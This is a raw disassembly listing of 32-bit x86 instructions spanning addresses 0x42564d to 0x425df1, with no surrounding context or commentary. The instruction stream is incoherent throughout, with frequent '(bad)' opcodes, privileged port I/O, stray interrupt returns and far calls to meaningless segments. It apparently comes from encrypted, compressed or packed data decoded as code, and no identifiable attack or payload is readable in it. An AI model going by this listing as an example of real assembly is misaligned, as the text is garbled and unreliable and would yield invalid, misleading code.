  42564d:	lds    esi,FWORD PTR [esi-0x3a549e8a]
  425653:	rol    DWORD PTR [ebx+0x5e],0xd5
  425657:	and    ecx,DWORD PTR [eax]
  425659:	push   eax
  42565a:	dec    esi
  42565b:	pop    ss
  42565c:	mov    dh,0xb6
  42565e:	push   ss
  42565f:	xor    DWORD PTR [edi+0x3a],esi
  425662:	pop    ss
  425663:	cs imul edx,esi,0xbb423096
  42566a:	xor    eax,0xe0a18105
  42566f:	inc    ebx
  425670:	sub    BYTE PTR [ebx+eax*2-0x25],dh
  425674:	rcl    BYTE PTR [esi-0x1d],cl
  425677:	shl    DWORD PTR [edi],1
  425679:	js     0x4256f7
  42567b:	add    ecx,ebp
  42567d:	pop    esi
  42567e:	add    ch,BYTE PTR [ecx+0x2e]
  425681:	ins    DWORD PTR es:[edi],dx
  425682:	dec    ebx
  425683:	sbb    edi,DWORD PTR [edx-0x79ba2872]
  425689:	into   
  42568a:	into   
  42568b:	dec    ebx
  42568c:	fnstenv [ebp+0x429844b]
  425692:	inc    ecx
  425693:	jnp    0x42563e
  425695:	jecxz  0x4256e9
  425697:	mov    ebx,0x313bb1b5
  42569c:	add    ch,ch
  42569e:	test   DWORD PTR [esi+0x25],eax
  4256a1:	xchg   ebp,eax
  4256a2:	xor    BYTE PTR [esi+0x21c0b0b0],0xc6
  4256a9:	(bad)  [esi-0x19c135b8]
  4256af:	fcomp  DWORD PTR [edx+0x6b]
  4256b2:	in     eax,dx
  4256b3:	scas   eax,DWORD PTR es:[edi]
  4256b4:	push   ebp
  4256b5:	pop    edi
  4256b6:	inc    ecx
  4256b7:	and    DWORD PTR [edx],ebx
  4256b9:	or     BYTE PTR [edx],cl
  4256bb:	mov    bh,0xb2
  4256bd:	fstp   st(2)
  4256bf:	sub    bl,BYTE PTR [edx-0x404d0cde]
  4256c5:	fistp  DWORD PTR [ebx+0x2c2e3add]
  4256cb:	jne    0x42570d
  4256cd:	int    0xd8
  4256cf:	rol    esi,1
  4256d1:	sub    ecx,DWORD PTR ds:0x3a0e69c
  4256d7:	mov    dh,0x9a
  4256d9:	jne    0x425705
  4256db:	mov    dl,0x1d
  4256dd:	ror    DWORD PTR [ebp+0x56d4d68d],1
  4256e3:	loope  0x4256f4
  4256e5:	jge    0x425668
  4256e7:	lods   al,BYTE PTR ds:[esi]
  4256e8:	nop
  4256e9:	mov    dh,0x85
  4256eb:	lods   eax,DWORD PTR ds:[esi]
  4256ec:	test   DWORD PTR [eax+0x22],edi
  4256ef:	iret   
  4256f0:	mov    esi,DWORD PTR [edi]
  4256f2:	dec    ecx
  4256f3:	mov    BYTE PTR [esp+edx*1],ch
  4256f6:	add    DWORD PTR [eax-0x67ae893],esi
  4256fc:	mov    ebx,DWORD PTR [ebx+0x6dbe8fe9]
  425702:	aas    
  425703:	pop    eax
  425704:	fcomp  st(6)
  425706:	nop
  425707:	lods   al,BYTE PTR ds:[esi]
  425708:	test   DWORD PTR [ecx-0x73fb1398],eax
  42570e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42570f:	mov    ch,0x6e
  425711:	ins    BYTE PTR es:[edi],dx
  425712:	cmp    al,0x8c
  425714:	adc    ebx,DWORD PTR [ebx]
  425716:	in     al,0xba
  425718:	xor    eax,0x609abec0
  42571d:	mov    ebx,0x3f905fb1
  425722:	aas    
  425723:	dec    ebx
  425724:	mov    edi,0xda492f53
  425729:	lods   eax,DWORD PTR ds:[esi]
  42572a:	jo     0x425707
  42572c:	enter  0x9207,0x44
  425730:	imul   dh
  425732:	sbb    eax,0x5b74cda5
  425737:	pop    edx
  425738:	push   0xffffffb7
  42573a:	(bad)  
  42573b:	mov    eax,0xa45f861d
  425740:	ja     0x425720
  425742:	inc    esp
  425743:	pop    edx
  425744:	pop    ss
  425745:	or     eax,0x2316a
  42574a:	popf   
  42574b:	clc    
  42574c:	push   esp
  42574d:	or     BYTE PTR [eax-0x26],bl
  425750:	jp     0x42574b
  425752:	mov    esp,0xdb6e0c1a
  425757:	mov    dh,0xb5
  425759:	pop    edi
  42575a:	push   eax
  42575b:	or     ah,BYTE PTR [esi+0x65]
  42575e:	xchg   DWORD PTR [ecx],edx
  425760:	mov    bh,BYTE PTR [eax]
  425762:	call   0xbd4:0xb0b6edb3
  425769:	add    dl,BYTE PTR [edx-0x6413d08a]
  42576f:	push   cs
  425770:	sbb    ch,BYTE PTR [eax+0x7b02e88e]
  425776:	test   al,0xca
  425778:	lahf   
  425779:	add    eax,0x50b6db6c
  42577e:	(bad)  
  425780:	repnz push 0x3238d7be
  425786:	inc    ebp
  425787:	push   ebx
  425788:	mov    ah,0x51
  42578a:	sub    eax,0x868e2c04
  42578f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425790:	mov    al,0xb5
  425792:	in     eax,dx
  425793:	push   edx
  425794:	lahf   
  425795:	sbb    bl,0xad
  425798:	mov    dh,0x19
  42579a:	mov    eax,ds:0xb1ba8d50
  42579f:	mov    cl,0xb0
  4257a1:	int    0xfb
  4257a3:	jl     0x4257ab
  4257a5:	inc    ebp
  4257a6:	dec    esp
  4257a7:	mov    ds:0x970a92e8,al
  4257ac:	call   0xe34f:0x8fb9b200
  4257b3:	jl     0x425790
  4257b5:	xchg   esi,eax
  4257b6:	xchg   esi,eax
  4257b7:	push   ss
  4257b8:	mov    gs,esi
  4257ba:	xchg   BYTE PTR [edi-0x3582353],ch
  4257c0:	adc    DWORD PTR [ebx],ebx
  4257c2:	or     BYTE PTR ds:0x993c5862,0xa8
  4257c9:	adc    esp,ecx
  4257cb:	inc    edi
  4257cc:	adc    al,0xcb
  4257ce:	push   ss
  4257cf:	aad    0xe2
  4257d1:	push   ecx
  4257d2:	out    0x2c,al
  4257d4:	mov    ah,0x1b
  4257d6:	pop    ebx
  4257d7:	inc    edi
  4257d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257d9:	cld    
  4257da:	arpl   WORD PTR [ecx-0x49bc3745],dx
  4257e0:	pop    ss
  4257e1:	ss sahf 
  4257e3:	outs   dx,BYTE PTR ds:[esi]
  4257e4:	cld    
  4257e5:	sbb    BYTE PTR [edx+eiz*2+0x17],ah
  4257e9:	inc    edx
  4257ea:	(bad)  
  4257eb:	jns    0x425852
  4257ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257ee:	mov    al,0xd1
  4257f0:	jbe    0x425832
  4257f2:	sbb    DWORD PTR [esi],edi
  4257f4:	lea    ecx,[esi]
  4257f6:	adc    eax,0xd5cddaa1
  4257fb:	mov    dh,0xe2
  4257fd:	in     al,dx
  4257fe:	fwait
  4257ff:	push   0x54190b95
  425804:	or     BYTE PTR [esi-0x2e8aecb],dh
  42580a:	fcmove st,st(7)
  42580c:	ror    dh,1
  42580e:	lds    ebx,FWORD PTR [esi-0xb]
  425811:	cmp    ah,BYTE PTR [edx]
  425813:	loopne 0x4257db
  425815:	adc    DWORD PTR [ecx+0x3c],0xdb07c6d8
  42581c:	mov    dh,0x55
  42581e:	add    dl,al
  425820:	cli    
  425821:	std    
  425822:	jp     0x425859
  425824:	inc    edi
  425825:	mov    ebx,DWORD PTR [ebx+0x1b]
  425828:	cmp    esp,DWORD PTR [edx-0x557a5dd7]
  42582e:	(bad)  
  42582f:	repnz retf 0xbca3
  425833:	(bad)  [eax+0x6b]
  425836:	das    
  425837:	mov    edi,0xdca6a307
  42583c:	xor    eax,0xadbd0055
  425841:	fstp   QWORD PTR [edx]
  425843:	mov    cl,0x41
  425845:	enter  0x469e,0xbc
  425849:	bound  edx,QWORD PTR [eax-0x26]
  42584c:	or     bl,bl
  42584e:	test   DWORD PTR [ebp+0x6a],esi
  425851:	lods   eax,DWORD PTR ds:[esi]
  425852:	xor    DWORD PTR [eax],edi
  425854:	bound  ebx,QWORD PTR [ebx+0x41]
  425857:	popf   
  425858:	test   eax,0x895b6b75
  42585d:	jmp    0x42586a
  42585f:	je     0x425892
  425861:	xor    al,0x60
  425863:	mov    BYTE PTR [edi+0x42b6d0b6],ah
  425869:	push   eax
  42586a:	das    
  42586b:	inc    ebx
  42586c:	add    al,0x13
  42586e:	jl     0x425802
  425870:	popa   
  425871:	mov    ds:0x3475fcb4,eax
  425876:	add    BYTE PTR [edi-0x6661bf6b],dh
  42587c:	jge    0x4258d6
  42587e:	mov    dh,0x35
  425880:	les    esi,FWORD PTR [esi-0x4b]
  425883:	out    dx,eax
  425884:	mov    eax,ds:0xd7955aa1
  425889:	shr    DWORD PTR [edi],0xb0
  42588c:	ins    BYTE PTR es:[edi],dx
  42588d:	xchg   esp,eax
  42588e:	in     eax,dx
  42588f:	push   0x8a41cbf7
  425894:	xchg   ecx,eax
  425895:	daa    
  425896:	pop    ebx
  425897:	in     eax,dx
  425898:	mov    dh,0xb0
  42589a:	scas   eax,DWORD PTR es:[edi]
  42589b:	or     esp,ebx
  42589d:	les    edx,FWORD PTR [eax+0x6c]
  4258a0:	mov    cl,0xe3
  4258a2:	pop    ds
  4258a3:	adc    bl,BYTE PTR [ebx-0x28]
  4258a6:	(bad)  
  4258a8:	add    DWORD PTR [eax],eax
  4258aa:	mov    ecx,fs
  4258ac:	outs   dx,BYTE PTR ds:[esi]
  4258ad:	ret    0x2b50
  4258b0:	and    eax,0xda361d8a
  4258b5:	mov    dh,0x71
  4258b7:	ins    DWORD PTR es:[edi],dx
  4258b8:	mov    edx,0xd6b2c27
  4258bd:	mov    bl,0x2d
  4258bf:	out    dx,al
  4258c0:	mov    al,0x5d
  4258c2:	pop    eax
  4258c3:	fmul   DWORD PTR [esi]
  4258c5:	cmc    
  4258c6:	add    al,0x52
  4258c8:	fs iret 
  4258ca:	pop    esp
  4258cb:	lds    esi,FWORD PTR [eax-0x1b]
  4258ce:	mov    edi,0x18f915d1
  4258d3:	or     ebp,0x92e70074
  4258d9:	add    dh,al
  4258db:	jmp    0x290e:0x6c6edb40
  4258e2:	adc    bh,BYTE PTR [ebx-0x4c]
  4258e5:	es call 0xed8dc5b9
  4258eb:	mov    dh,0x0
  4258ed:	ret    0x5786
  4258f0:	mov    DWORD PTR cs:[edi-0x3b],eax
  4258f4:	add    eax,0x54b1ada1
  4258f9:	sub    bl,bh
  4258fb:	inc    eax
  4258fc:	push   esi
  4258fd:	enter  0x2f06,0x58
  425901:	fdiv   DWORD PTR [esi-0x43442553]
  425907:	jecxz  0x425890
  425909:	xchg   BYTE PTR [eax],dl
  42590b:	mov    al,ds:0x6b6a0d99
  425910:	pop    esp
  425911:	pop    ebx
  425912:	out    dx,eax
  425913:	ins    DWORD PTR es:[edi],dx
  425914:	jb     0x425960
  425916:	(bad)  
  425917:	cmp    BYTE PTR [esi-0x3db4912c],dh
  42591d:	jae    0x4258e7
  42591f:	xchg   ebx,eax
  425920:	aaa    
  425921:	add    eax,0xdbd78efe
  425926:	rol    dl,cl
  425928:	(bad)  
  425929:	lods   eax,DWORD PTR ds:[esi]
  42592a:	inc    edx
  42592b:	and    BYTE PTR [ebp+0x1d],dl
  42592e:	sbb    cl,BYTE PTR [esi]
  425930:	out    0xd9,al
  425932:	shr    DWORD PTR [esi+0x14],1
  425935:	outs   dx,BYTE PTR ds:[esi]
  425936:	cmp    ah,bh
  425938:	jmp    0x4258cb
  42593a:	push   ds
  42593b:	xchg   edi,eax
  42593c:	std    
  42593d:	sub    BYTE PTR [edi-0x4c],0x5b
  425941:	mov    ebx,0x2651d29c
  425946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425947:	pop    esi
  425948:	pop    esi
  425949:	enter  0xe4de,0xa0
  42594d:	add    BYTE PTR [ebp+0x17],bh
  425950:	ss xchg esi,eax
  425952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425953:	test   BYTE PTR [edx],dl
  425955:	call   0xf63a4aa9
  42595a:	lea    ebx,[ebx+0x6d]
  42595d:	fnstcw WORD PTR [eax+0x4827458c]
  425963:	pushf  
  425964:	out    dx,al
  425965:	cwde   
  425966:	xor    al,0x5c
  425968:	test   DWORD PTR [ebp-0x727c7dda],eax
  42596e:	sbb    ebp,DWORD PTR [ecx+0x23b0c1d1]
  425974:	clc    
  425975:	(bad)  
  425976:	aam    0xd
  425978:	xor    esp,ebx
  42597a:	jp     0x4259bc
  42597c:	aad    0x14
  42597e:	ins    DWORD PTR es:[edi],dx
  42597f:	sbb    ebp,DWORD PTR [ebp+0x57]
  425982:	(bad)  
  425983:	push   cs
  425984:	mov    bl,0xe3
  425986:	xchg   esi,eax
  425987:	test   al,0x2c
  425989:	mov    esp,0xb6ed4428
  42598e:	dec    edx
  42598f:	rcr    DWORD PTR [edi-0x55],1
  425992:	sbb    DWORD PTR [esp+eax*1-0x1939247b],esp
  425999:	aas    
  42599a:	je     0x425a11
  42599c:	ss test dh,0x3
  4259a0:	(bad)  
  4259a1:	(bad)  
  4259a2:	das    
  4259a3:	ins    BYTE PTR es:[edi],dx
  4259a4:	test   DWORD PTR [ebx],ecx
  4259a6:	mov    ch,0x5b
  4259a8:	lock jae 0x42599d
  4259ab:	cmp    DWORD PTR [ecx+0x7b],esp
  4259ae:	out    dx,al
  4259af:	add    BYTE PTR [ebx-0x28],bl
  4259b2:	push   ss
  4259b3:	xchg   esi,eax
  4259b4:	lods   al,BYTE PTR ds:[esi]
  4259b5:	pusha  
  4259b6:	int    0xf
  4259b8:	iret   
  4259b9:	fild   DWORD PTR [edi]
  4259bb:	in     eax,dx
  4259bc:	sub    DWORD PTR [eax-0x1f9ead7b],esp
  4259c2:	mov    esi,0x5619102a
  4259c7:	sub    BYTE PTR [ebp-0x15],0xdf
  4259cb:	adc    al,0xbc
  4259cd:	mov    BYTE PTR ds:0x9d1dc77,bl
  4259d3:	mov    bh,0x95
  4259d5:	in     eax,dx
  4259d6:	mov    dh,0xb7
  4259d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259d9:	jno    0x425a49
  4259db:	sbb    eax,0x42d66474
  4259e0:	adc    esi,DWORD PTR [ebx+eiz*1-0x6a]
  4259e4:	jmp    FWORD PTR [ecx-0x2962d32d]
  4259ea:	shl    DWORD PTR [esi-0x1341bb13],1
  4259f0:	xchg   DWORD PTR [ebx],edi
  4259f2:	mov    ah,0xd1
  4259f4:	sub    bh,dl
  4259f6:	mov    edi,0xad896dc0
  4259fb:	jae    0x42598f
  4259fd:	or     eax,0xc8a07dcb
  425a02:	fimul  DWORD PTR [edi-0x2abbe292]
  425a08:	mov    esp,0x9dfd9761
  425a0d:	leave  
  425a0e:	jge    0x4259c4
  425a10:	pop    ebx
  425a11:	pop    ebx
  425a12:	mov    ds:0x5da2d70,al
  425a17:	retf   0x2973
  425a1a:	imul   edx,DWORD PTR [edi],0x14366850
  425a20:	pop    edx
  425a21:	xchg   esi,eax
  425a22:	and    al,0x2c
  425a24:	xchg   edi,eax
  425a25:	sbb    ch,BYTE PTR [eax+0x3749535b]
  425a2b:	jb     0x4259bd
  425a2d:	gs pop esi
  425a2f:	mov    ch,0x85
  425a31:	(bad)  
  425a32:	mov    dh,0x6d
  425a34:	pop    esp
  425a35:	cmp    ch,BYTE PTR [edx-0x4edfca68]
  425a3b:	les    esi,FWORD PTR [eax-0x25]
  425a3e:	fdiv   DWORD PTR [esi-0x55a197c3]
  425a44:	cmp    edx,DWORD PTR [ecx-0x74]
  425a47:	repnz sub eax,0xb0bb46bb
  425a4d:	cmp    eax,0xa0cb2457
  425a52:	push   edx
  425a53:	sub    BYTE PTR ds:0xb2e037d,ah
  425a59:	fcmovnb st,st(6)
  425a5b:	ss ss jns 0x425abb
  425a5f:	popa   
  425a60:	xchg   edi,eax
  425a61:	cmp    eax,0x42ededd7
  425a66:	mov    ebx,0x6fbf46b5
  425a6b:	inc    esi
  425a6c:	cmc    
  425a6d:	and    eax,0x16860cb0
  425a72:	sbb    bl,BYTE PTR [ebx+0x312746aa]
  425a78:	push   ds
  425a79:	daa    
  425a7a:	or     eax,0xadb6da20
  425a7f:	(bad)  [edi]
  425a81:	ret    
  425a82:	jle    0x425abf
  425a84:	mov    dh,0x7
  425a86:	sbb    cl,BYTE PTR [ebp+0x5c51e165]
  425a8c:	pop    eax
  425a8d:	pop    eax
  425a8e:	jp     0x425a85
  425a90:	fs dec edi
  425a92:	pop    es
  425a93:	clc    
  425a94:	sbb    ebx,DWORD PTR [ebx-0x45]
  425a97:	mov    ch,0x5d
  425a99:	sti    
  425a9a:	sar    ecx,cl
  425a9c:	push   0x5351db1d
  425aa1:	pop    ecx
  425aa2:	cs mov ebx,0xdb1bb6d5
  425aa8:	(bad)
  425aab:	push   ebp
  425aac:	and    edi,DWORD PTR [eax+0x6d2ceae9]
  425ab2:	mov    ch,0x5b
  425ab4:	pop    ebx
  425ab5:	adc    al,0x4b
  425ab7:	mov    esp,eax
  425ab9:	dec    edx
  425aba:	test   eax,0x6a8671cd
  425abf:	mov    ebx,0x29701db4
  425ac4:	xchg   BYTE PTR [esi+0x17],bl
  425ac7:	imul   esi,edx,0xa5c6b6b7
  425acd:	rcr    DWORD PTR [ecx+0x1e],0xd6
  425ad1:	mov    ds:0x5958fa50,al
  425ad6:	fistp  WORD PTR [ebp-0x26]
  425ad9:	fcomp  DWORD PTR [edx]
  425adb:	jnp    0x425a9f
  425add:	ret    
  425ade:	test   BYTE PTR [edx+esi*1-0x3abb719a],dl
  425ae5:	ins    DWORD PTR es:[edi],dx
  425ae6:	mov    eax,ds:0x5fe6108c
  425aeb:	mov    ds:0x5bb602d8,eax
  425af0:	fild   DWORD PTR [eax]
  425af2:	mov    ebx,0xb59b416c
  425af7:	outs   dx,BYTE PTR ds:[esi]
  425af8:	repnz and eax,0x60a36d11
  425afe:	pop    es
  425aff:	mov    bl,0x99
  425b01:	dec    edi
  425b02:	mov    bl,0x37
  425b04:	fisub  DWORD PTR [ebp-0x55]
  425b07:	clc    
  425b08:	popa   
  425b09:	jp     0x425b4d
  425b0b:	jb     0x425b30
  425b0d:	push   edi
  425b0e:	(bad)  [ecx-0x53]
  425b11:	pop    ebp
  425b12:	push   0xb
  425b14:	add    ebp,ebx
  425b16:	(bad)  
  425b17:	clc    
  425b18:	fisubr WORD PTR [ebp+0x7d]
  425b1b:	pop    edi
  425b1c:	ins    DWORD PTR es:[edi],dx
  425b1d:	fild   DWORD PTR [ecx-0x49]
  425b20:	jno    0x425ab1
  425b22:	test   al,0x7e
  425b24:	jg     0x425b06
  425b26:	cmp    ah,BYTE PTR [ebp+0x22]
  425b29:	and    BYTE PTR [ebp+0x4b],al
  425b2c:	sbb    ebx,DWORD PTR [ebx]
  425b2e:	inc    ebp
  425b2f:	mov    dl,BYTE PTR [ebx-0x4976be1e]
  425b35:	scas   al,BYTE PTR es:[edi]
  425b36:	ins    DWORD PTR es:[edi],dx
  425b37:	mov    eax,ds:0x5627315c
  425b3c:	out    0xfa,eax
  425b3e:	pop    edi
  425b3f:	je     0x425b93
  425b41:	imul   ebx,ebx,0xffffffd8
  425b44:	push   ss
  425b45:	cmp    BYTE PTR [edx+0x26],0x26
  425b49:	daa    
  425b4a:	clc    
  425b4b:	jge    0x425b10
  425b4d:	mov    eax,0x52ed6eda
  425b52:	adc    al,0x4c
  425b54:	enter  0x6ba7,0xe2
  425b58:	xchg   edi,eax
  425b59:	adc    BYTE PTR [eax+0x50b6d2d2],0x89
  425b60:	dec    edi
  425b61:	mov    edx,0x32836f0e
  425b66:	push   cs
  425b67:	test   DWORD PTR [ebp+0x4267ed05],ebp
  425b6d:	xlat   BYTE PTR ds:[ebx]
  425b6e:	or     bl,BYTE PTR [ecx+0x31]
  425b71:	add    DWORD PTR [ecx],ecx
  425b73:	sub    dl,BYTE PTR [esi+esi*4]
  425b76:	fwait
  425b77:	(bad)  
  425b78:	xchg   edx,eax
  425b79:	rol    DWORD PTR [ecx-0x5a383958],cl
  425b7f:	mov    dh,0xa6
  425b81:	xchg   ecx,eax
  425b82:	adc    DWORD PTR [ebx],esp
  425b84:	jb     0x425bf2
  425b86:	stos   DWORD PTR es:[edi],eax
  425b87:	pop    edi
  425b88:	mov    BYTE PTR [ebx+ebx*8+0x6],0xe0
  425b8d:	add    DWORD PTR [ecx+esi*4],0x1777a861
  425b94:	mov    edx,0x8d746db1
  425b99:	mov    ds:0x7b741015,eax
  425b9e:	pop    edx
  425b9f:	(bad)  
  425ba0:	outs   dx,DWORD PTR ds:[esi]
  425ba1:	(bad)  
  425ba2:	int    0xd4
  425ba4:	push   esi
  425ba5:	aam    0x8f
  425ba7:	ins    BYTE PTR es:[edi],dx
  425ba8:	lea    edx,[ecx]
  425baa:	pop    ebp
  425bab:	sbb    BYTE PTR [esi],al
  425bad:	xchg   edi,eax
  425bae:	push   ss
  425baf:	mov    dh,0x4a
  425bb1:	cmp    DWORD PTR [edx],0xffffffe2
  425bb4:	push   es
  425bb5:	imul   ebx,DWORD PTR [edx-0x2524ca7b],0xffffffad
  425bbc:	test   edi,eax
  425bbe:	mov    al,ds:0xb63699a0
  425bc3:	mov    edi,0x80950b65
  425bc8:	lea    ebp,[ebp-0x1d]
  425bcb:	pop    edi
  425bcc:	jno    0x425c04
  425bce:	stos   DWORD PTR es:[edi],eax
  425bcf:	xor    DWORD PTR [eax-0x49],ebp
  425bd2:	ins    DWORD PTR es:[edi],dx
  425bd3:	leave  
  425bd4:	push   eax
  425bd5:	jno    0x425c0f
  425bd7:	xlat   BYTE PTR ds:[ebx]
  425bd8:	sbb    DWORD PTR [edi+0x3c],0x51
  425bdc:	gs ins DWORD PTR es:[edi],dx
  425bde:	fld    TBYTE PTR [ebp-0x25]
  425be1:	imul   edx,ecx,0x281d72a1
  425be7:	sahf   
  425be8:	stos   BYTE PTR es:[edi],al
  425be9:	scas   eax,DWORD PTR es:[edi]
  425bea:	mov    dh,0x28
  425bec:	add    BYTE PTR [ebx+0x6d],bl
  425bef:	pop    es
  425bf0:	xchg   esp,eax
  425bf1:	pop    ds
  425bf2:	jns    0x425c32
  425bf4:	xchg   esp,eax
  425bf5:	jne    0x425bd1
  425bf7:	pop    eax
  425bf8:	fsubr  DWORD PTR [edx+0x8]
  425bfb:	or     ch,BYTE PTR [ebx+0x6d]
  425bfe:	hlt    
  425bff:	mov    bh,0xb8
  425c01:	lods   eax,DWORD PTR ds:[esi]
  425c02:	je     0x425c6d
  425c04:	pop    ebx
  425c05:	push   esi
  425c06:	sub    DWORD PTR [eax+0x3f],ebp
  425c09:	adc    DWORD PTR [ebp+ecx*8-0x74],eax
  425c0d:	pop    esp
  425c0e:	popa   
  425c0f:	imul   esp,DWORD PTR [ebx-0x75],0xe4040ccd
  425c16:	cwde   
  425c17:	add    eax,0x6f2e88b4
  425c1c:	jno    0x425c89
  425c1e:	and    eax,0xc9f033fa
  425c23:	jge    0x425c25
  425c25:	inc    eax
  425c26:	or     al,dl
  425c28:	xchg   esp,eax
  425c29:	ins    DWORD PTR es:[edi],dx
  425c2a:	mov    ebx,0x33714835
  425c2f:	add    DWORD PTR [esi],edi
  425c31:	dec    ecx
  425c32:	fcmovu st,st(0)
  425c34:	mov    ah,0xdb
  425c36:	(bad)  
  425c37:	outs   dx,BYTE PTR ds:[esi]
  425c38:	mov    bh,0x19
  425c3a:	not    BYTE PTR [edi]
  425c3c:	push   eax
  425c3d:	clc    
  425c3e:	je     0x425c35
  425c40:	jmp    0xa68de1cb
  425c45:	inc    edx
  425c46:	mov    ebp,0x7c7e5f35
  425c4b:	popa   
  425c4c:	in     eax,dx
  425c4d:	xor    BYTE PTR [esi-0x33e3d7f5],0xbf
  425c54:	jmp    0x8d6dfe72
  425c59:	jbe    0x425bfe
  425c5b:	mov    cl,0x1d
  425c5d:	loope  0x425c80
  425c5f:	cdq    
  425c60:	inc    ebp
  425c61:	sbb    al,cl
  425c63:	cmovge eax,ebp
  425c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c67:	lea    eax,[ecx]
  425c69:	lock js 0x425cce
  425c6c:	xchg   BYTE PTR [edx],cl
  425c6e:	pop    eax
  425c6f:	jl     0x425c4c
  425c71:	push   ecx
  425c72:	sbb    eax,0xb371beb4
  425c77:	mov    ecx,0x7a8d3924
  425c7c:	cs ins BYTE PTR es:[edi],dx
  425c7e:	mov    ah,0x5b
  425c80:	or     BYTE PTR [esi+0x63999ed2],ch
  425c86:	sub    ebp,eax
  425c88:	push   0x2eb71f8
  425c8d:	(bad)  
  425c8e:	ficomp WORD PTR [esp+edx*1-0x12]
  425c92:	dec    ebx
  425c93:	sub    DWORD PTR [ebx+0x6a],ebx
  425c96:	fisttp DWORD PTR [esi]
  425c98:	(bad)  
  425c9a:	rol    DWORD PTR [ebp+0x392fe2ea],cl
  425ca0:	pop    ecx
  425ca1:	int    0x17
  425ca3:	push   0xffffffdc
  425ca5:	push   ss
  425ca6:	in     eax,0x77
  425ca8:	mov    ah,0x1a
  425caa:	xor    eax,0x1e6d00dc
  425caf:	pop    ebx
  425cb0:	fcmovnu st,st(0)
  425cb2:	add    DWORD PTR ds:0xd7d29dbc,edx
  425cb8:	mov    dh,0x62
  425cba:	gs mov dh,0x2
  425cbd:	mov    cl,0xb5
  425cbf:	cmp    DWORD PTR ds:[esi+edx*4+0x16cea7af],0xffffffb6
  425cc8:	in     eax,0x17
  425cca:	out    dx,al
  425ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ccc:	mov    dl,0x0
  425cce:	mov    DWORD PTR [edx+0x40fb9b07],ecx
  425cd4:	mov    ch,0xb6
  425cd6:	lock ins DWORD PTR es:[edi],dx
  425cd8:	aas    
  425cd9:	adc    eax,0xfd59da5e
  425cde:	in     al,dx
  425cdf:	jg     0x425d36
  425ce1:	pusha  
  425ce2:	and    BYTE PTR [ebx+ecx*1-0x6cf61e93],dh
  425ce9:	out    dx,al
  425cea:	mov    eax,ds:0x1ac6b241
  425cef:	bound  ebx,QWORD PTR [edx-0x18]
  425cf2:	add    BYTE PTR [esi],ch
  425cf4:	aaa    
  425cf5:	out    0x7b,eax
  425cf7:	or     dh,ah
  425cf9:	mov    es,eax
  425cfb:	pop    edi
  425cfc:	sbb    eax,DWORD PTR [ecx+0x3]
  425cff:	loop   0x425d08
  425d01:	call   DWORD PTR [edi+ebx*8+0x1b4b89e3]
  425d08:	and    al,0xa5
  425d0a:	pop    ss
  425d0b:	ins    WORD PTR es:[edi],dx
  425d0d:	hlt    
  425d0e:	stos   BYTE PTR es:[edi],al
  425d0f:	push   ecx
  425d10:	pop    eax
  425d11:	fdiv   DWORD PTR [esi+0x1d65416d]
  425d17:	sbb    eax,0xf1ae4a87
  425d1c:	push   cs
  425d1d:	sub    al,0x95
  425d1f:	mov    al,ds:0x1dfa12dd
  425d24:	shl    DWORD PTR ds:0xadb70408,1
  425d2a:	adc    BYTE PTR [eax+edx*1],ch
  425d2d:	je     0x425cc1
  425d2f:	push   eax
  425d30:	out    dx,al
  425d31:	sti    
  425d32:	or     eax,0x346db16c
  425d37:	inc    ecx
  425d38:	js     0x425d94
  425d3a:	mov    edx,0xed07b69e
  425d3f:	mov    dl,0xb6
  425d42:	pop    edx
  425d43:	push   ds
  425d44:	sub    ebp,esi
  425d46:	mov    al,ds:0x497a595
  425d4b:	inc    esp
  425d4c:	sub    eax,0x13b6d56d
  425d51:	or     BYTE PTR [ebp+0x686a1a9b],ch
  425d57:	or     ecx,DWORD PTR [ebp-0xa493d13]
  425d5d:	and    bl,BYTE PTR [eax+edi*2-0x12]
  425d61:	and    esi,esp
  425d63:	pop    edi
  425d64:	les    ecx,FWORD PTR [ecx]
  425d66:	push   esi
  425d67:	fisubr DWORD PTR [esi+0xb]
  425d6a:	sbb    al,0xb3
  425d6c:	pop    ss
  425d6d:	lahf   
  425d6e:	rcl    esp,0xf2
  425d71:	cmc    
  425d72:	xlat   BYTE PTR ds:[ebx]
  425d73:	outs   dx,BYTE PTR ds:[esi]
  425d74:	xchg   ebp,eax
  425d75:	outs   dx,BYTE PTR ds:[esi]
  425d76:	in     eax,dx
  425d77:	pop    ds
  425d78:	cmovp  edi,DWORD PTR [ebx]
  425d7b:	jne    0x425df3
  425d7d:	je     0x425d64
  425d7f:	fmul   DWORD PTR [edi-0x2587a7a5]
  425d85:	retf   
  425d86:	iret   
  425d87:	jp     0x425e08
  425d89:	popa   
  425d8a:	lock cmp eax,0xea29a0
  425d90:	xchg   esi,eax
  425d91:	push   0xffffffde
  425d93:	adc    BYTE PTR ds:0x76c65c68,0x5b
  425d9a:	fcomp  DWORD PTR [edx+0x6bd9526d]
  425da0:	mov    BYTE PTR [ecx+edx*1-0x249c7e40],cl
  425da7:	fcmovbe st,st(2)
  425da9:	xor    BYTE PTR [ecx+0x28],bl
  425dac:	pop    esp
  425dad:	out    dx,eax
  425dae:	test   BYTE PTR [edi-0x73],al
  425db1:	inc    ebp
  425db2:	pop    edx
  425db3:	pop    eax
  425db4:	push   0x61
  425db6:	pop    ebp
  425db7:	int    0x76
  425db9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  425dbb:	dec    edi
  425dbc:	enter  0xa095,0x2d
  425dc0:	mov    dh,0x44
  425dc2:	das    
  425dc3:	daa    
  425dc4:	mov    edi,0x35b1b063
  425dc9:	xlat   BYTE PTR cs:[ebx]
  425dcb:	imul   esi,DWORD PTR [ecx+eiz*1],0xffffffec
  425dcf:	add    eax,0xc2c6ea3f
  425dd4:	inc    edx
  425dd5:	mov    ebx,0xe963cd04
  425dda:	push   ebp
  425ddb:	xchg   ecx,eax
  425ddc:	jae    0x425e29
  425dde:	lahf   
  425ddf:	arpl   WORD PTR [ebx-0x7b31a4b],di
  425de5:	dec    edx
  425de6:	sub    DWORD PTR [edi-0x7f9447d6],ecx
  425dec:	sbb    eax,edx
  425dee:	ret    0x56c2
  425df1:	pop    eax
